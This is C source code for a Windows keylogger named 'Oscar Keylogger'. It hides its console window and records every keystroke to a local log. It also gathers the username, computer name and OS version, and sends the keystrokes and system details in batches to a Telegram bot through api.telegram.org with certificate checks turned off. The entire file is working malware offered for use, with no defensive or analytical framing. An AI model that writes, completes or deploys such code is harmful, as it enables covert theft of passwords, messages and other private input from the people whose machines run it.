
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <windows.h>
#include <time.h>
#include <ctype.h>


typedef struct {
    char bot_token[256];
    char chat_id[256];
    char log_file_path[512];
    int is_running;
    int key_count;
    int max_keys_before_send;
} Keylogger;


void get_current_time(char* buffer, int size) {
    time_t now = time(0);
    struct tm* t = localtime(&now);
    strftime(buffer, size, "%Y-%m-%d_%H-%M-%S", t);
}

void get_timestamp(char* buffer, int size) {
    time_t now = time(0);
    struct tm* t = localtime(&now);
    strftime(buffer, size, "[%Y-%m-%d %H:%M:%S] ", t);
}

void create_log_directory() {
    CreateDirectory("logs", NULL);
}


int send_to_telegram(const char* token, const char* chat_id, const char* message) {
    CURL* curl = curl_easy_init();
    if (!curl) return 0;

    char* escaped = curl_easy_escape(curl, message, strlen(message));
    if (!escaped) {
        curl_easy_cleanup(curl);
        return 0;
    }

    char url[1024];
    snprintf(url, sizeof(url), 
        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", 
        token, chat_id, escaped);
    curl_free(escaped);

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    CURLcode res = curl_easy_perform(curl);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK);
}


const char* key_to_string(int key_code, int is_shift_pressed) {
    static char result[32];
    
    switch (key_code) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "\n[ENTER]\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DELETE: return "[DELETE]";
        case VK_HOME: return "[HOME]";
        case VK_END: return "[END]";
        case VK_PRIOR: return "[PAGE_UP]";
        case VK_NEXT: return "[PAGE_DOWN]";
        case VK_INSERT: return "[INSERT]";
        case VK_PRINT: return "[PRINT_SCREEN]";
        case VK_SNAPSHOT: return "[PRINT_SCREEN]";
        case VK_SCROLL: return "[SCROLL_LOCK]";
        case VK_PAUSE: return "[PAUSE]";
        case VK_NUMLOCK: return "[NUM_LOCK]";
        
        // 0-9
        case 0x30 ... 0x39:
            if (is_shift_pressed) {
                static const char* shift_numbers = ")!@#$%^&*(";
                snprintf(result, sizeof(result), "%c", shift_numbers[key_code - 0x30]);
                return result;
            }
            snprintf(result, sizeof(result), "%c", (char)key_code);
            return result;
            
        // A-Z
        case 0x41 ... 0x5A: {
            char c = (char)key_code;
            if (!is_shift_pressed && !(GetKeyState(VK_CAPITAL) & 0x0001)) {
                c = tolower(c);
            }
            snprintf(result, sizeof(result), "%c", c);
            return result;
        }
        
        // NumPad 0-9
        case 0x60 ... 0x69:
            snprintf(result, sizeof(result), "%c", (char)(key_code - 0x60 + '0'));
            return result;
            
        case 0xBA: return is_shift_pressed ? ":" : ";";
        case 0xBB: return is_shift_pressed ? "+" : "=";
        case 0xBC: return is_shift_pressed ? "<" : ",";
        case 0xBD: return is_shift_pressed ? "_" : "-";
        case 0xBE: return is_shift_pressed ? ">" : ".";
        case 0xBF: return is_shift_pressed ? "?" : "/";
        case 0xC0: return is_shift_pressed ? "~" : "`";
        case 0xDB: return is_shift_pressed ? "{" : "[";
        case 0xDC: return is_shift_pressed ? "|" : "\\";
        case 0xDD: return is_shift_pressed ? "}" : "]";
        case 0xDE: return is_shift_pressed ? "\"" : "'";
            
        default:
            snprintf(result, sizeof(result), "[%d]", key_code);
            return result;
    }
}


int is_shift_pressed() {
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
}


void get_system_info(char* buffer, int size) {
    char temp[256];
    buffer[0] = '\0';
    
    strcat(buffer, "🖥️ System Information:\n");
    
    // Username
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserName(username, &username_len)) {
        snprintf(temp, sizeof(temp), "👤 User: %s\n", username);
        strcat(buffer, temp);
    }
    
    // Computer name
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD comp_size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerName(computer_name, &comp_size)) {
        snprintf(temp, sizeof(temp), "💻 Computer: %s\n", computer_name);
        strcat(buffer, temp);
    }
    
    // OS Version
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionEx(&osvi)) {
        snprintf(temp, sizeof(temp), "🪟 OS: Windows %d.%d (Build %d)\n", 
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        strcat(buffer, temp);
    }
    
    // Processor cores
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    snprintf(temp, sizeof(temp), "🖥️ Processor: %d cores\n", sysInfo.dwNumberOfProcessors);
    strcat(buffer, temp);
}


void start_logging(Keylogger* logger) {
    logger->is_running = 1;
    logger->key_count = 0;
    logger->max_keys_before_send = 50;
    
    FILE* log_file = fopen(logger->log_file_path, "a");
    if (!log_file) {
        return;
    }
    
    char buffer[8192] = {0};
    char timestamp[64];
    char system_info[1024];
    
    get_system_info(system_info, sizeof(system_info));
    char start_msg[2048];
    snprintf(start_msg, sizeof(start_msg), "✅ Keylogger Started!\n%s", system_info);
    send_to_telegram(logger->bot_token, logger->chat_id, start_msg);
    
    while (logger->is_running) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                int shift = is_shift_pressed();
                const char* key_str = key_to_string(key, shift);
                
                fprintf(log_file, "%s", key_str);
                fflush(log_file);
                
                strcat(buffer, key_str);
                logger->key_count++;
                
                if (logger->key_count >= logger->max_keys_before_send || key == VK_RETURN) {
                    if (strlen(buffer) > 0) {
                        get_timestamp(timestamp, sizeof(timestamp));
                        char log_entry[8192];
                        snprintf(log_entry, sizeof(log_entry), "%s%s", timestamp, buffer);
                        send_to_telegram(logger->bot_token, logger->chat_id, log_entry);
                        buffer[0] = '\0';
                        logger->key_count = 0;
                    }
                }
                
                while (GetAsyncKeyState(key) & 0x8000) {
                    Sleep(10);
                }
            }
        }
        Sleep(5);
    }
    
    fclose(log_file);
}


void init_keylogger(Keylogger* logger, const char* token, const char* chat_id) {
    strncpy(logger->bot_token, token, sizeof(logger->bot_token) - 1);
    strncpy(logger->chat_id, chat_id, sizeof(logger->chat_id) - 1);
    logger->bot_token[sizeof(logger->bot_token) - 1] = '\0';
    logger->chat_id[sizeof(logger->chat_id) - 1] = '\0';
    logger->is_running = 0;
    logger->key_count = 0;
    
    create_log_directory();
    
    char time_str[64];
    get_current_time(time_str, sizeof(time_str));
    snprintf(logger->log_file_path, sizeof(logger->log_file_path), 
        "logs/log_%s.log", time_str);
}

void run_hidden(Keylogger* logger) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    start_logging(logger);
}


int main(int argc, char* argv[]) {
    char token[256] = "YOUR_TELEGRAM_BOT_TOKEN";
    char chat_id[256] = "YOUR_CHAT_ID";
    
    if (argc >= 3) {
        strncpy(token, argv[1], sizeof(token) - 1);
        strncpy(chat_id, argv[2], sizeof(chat_id) - 1);
        token[sizeof(token) - 1] = '\0';
        chat_id[sizeof(chat_id) - 1] = '\0';
    }
    
    if (strcmp(token, "YOUR_TELEGRAM_BOT_TOKEN") == 0 || 
        strcmp(chat_id, "YOUR_CHAT_ID") == 0) {
        fprintf(stderr, "❌ Error: Please set your Telegram Bot Token and Chat ID\n");
        fprintf(stderr, "Usage: %s <BOT_TOKEN> <CHAT_ID>\n", argv[0]);
        fprintf(stderr, "Or edit the source code and set default values.\n");
        return 1;
    }
    
    printf("🔐 Oscar Keylogger Starting...\n");
    
    Keylogger logger;
    init_keylogger(&logger, token, chat_id);
    run_hidden(&logger);
    
    return 0;
}